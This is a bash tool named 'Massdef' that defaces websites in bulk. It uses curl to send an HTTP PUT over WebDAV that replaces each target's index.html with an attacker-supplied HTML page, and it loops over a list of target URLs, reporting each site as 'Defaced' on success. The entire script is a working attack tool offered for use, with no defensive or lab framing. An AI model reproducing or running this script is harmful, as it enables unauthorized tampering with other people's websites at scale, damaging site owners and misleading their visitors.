#!/bin/bash

# Author: Haitham Aouati
# GitHub: github.com/haithamaouati

# Colors
nc="\e[0m"
bold="\e[1m"
underline="\e[4m"
bold_green="\e[1;32m"
bold_red="\e[1;31m"
bold_yellow="\e[1;33m"

# Banner
print_banner() {
    clear
    echo -e "${bold_red}"
    cat << "EOF"
                              _         __
  /\/\    __ _  ___  ___   __| |  ___  / _|
 /    \  / _` |/ __|/ __| / _` | / _ \| |_
/ /\/\ \| (_| |\__ \\__ \| (_| ||  __/|  _|
\/    \/ \__,_||___/|___/ \__,_| \___||_|
EOF
    echo -e "${nc}"
    echo -e " ${bold_red}Massdef${nc} — Mass Defacement via WebDAV PUT\n"
    echo -e " Author: Haitham Aouati"
    echo -e " GitHub: ${underline}github.com/haithamaouati${nc}\n"
}

# Help Menu
print_help() {
    print_banner
    echo -e "${bold}Usage:${nc} $0 -f <deface_file> [-t <target|targets.txt>]"
    echo -e "\nOptions:"
    echo -e "  -f, --file      Deface script file (HTML)"
    echo -e "  -t, --target    Single target URL or path to file of targets"
    echo -e "  -h, --help      Show this help message"
    echo ""
}

# Dependency check
check_requirements() {
    command -v curl >/dev/null 2>&1 || {
        echo -e "${bold_red}[!]${nc} curl is required but not installed."
        exit 1
    }
}

# Upload function
upload() {
    local site="$1"
    [[ "$site" != http* ]] && site="http://$site"

    local response=$(curl -s -o /dev/null -w "%{http_code}" -T "$DEFACE_FILE" "$site/index.html")

    if [[ "$response" =~ ^2 ]]; then
        echo -e "${bold_green}[+] Defaced:${nc} $site/index.html"
    else
        echo -e "${bold_red}[-] Failed (${response}):${nc} $site/index.html"
    fi
}

# Target handling
upload_to_targets() {
    if [[ -f "$TARGET_INPUT" ]]; then
        while IFS= read -r line || [[ -n $line ]]; do
            line=$(echo "$line" | xargs)
            [[ -z "$line" ]] && continue
            upload "$line"
        done < "$TARGET_INPUT"
    else
        upload "$TARGET_INPUT"
    fi
}

# === MAIN ===
if [[ $# -eq 0 ]]; then
    print_help
    exit 0
fi

DEFACE_FILE=""
TARGET_INPUT=""

# Parse args
while [[ $# -gt 0 ]]; do
    case "$1" in
        -f|--file)
            DEFACE_FILE="$2"
            shift 2
            ;;
        -t|--target)
            TARGET_INPUT="$2"
            shift 2
            ;;
        -h|--help)
            print_help
            exit 0
            ;;
        *)
            echo -e "${bold_red}[!]${nc} Unknown argument: $1"
            print_help
            exit 1
            ;;
    esac
done

print_banner
check_requirements

# Input validation
if [[ -z "$DEFACE_FILE" ]]; then
    echo -e "${bold_red}[!]${nc} Missing deface file. Use -f <file>.\n"
    exit 1
fi

if [[ ! -f "$DEFACE_FILE" ]]; then
    echo -e "${bold_red}[!]${nc} Deface file '$DEFACE_FILE' not found.\n"
    exit 1
fi

if [[ -z "$TARGET_INPUT" ]]; then
    if [[ ! -f "targets.txt" ]]; then
        echo -e "${bold_red}[!]${nc} No target provided and 'targets.txt' not found.\n"
        exit 1
    fi
    TARGET_INPUT="targets.txt"
fi

echo -e "${bold}[*]${nc} Starting upload...\n"
upload_to_targets
echo -e "\n${bold_green}[+]${nc} Upload process completed.\n"
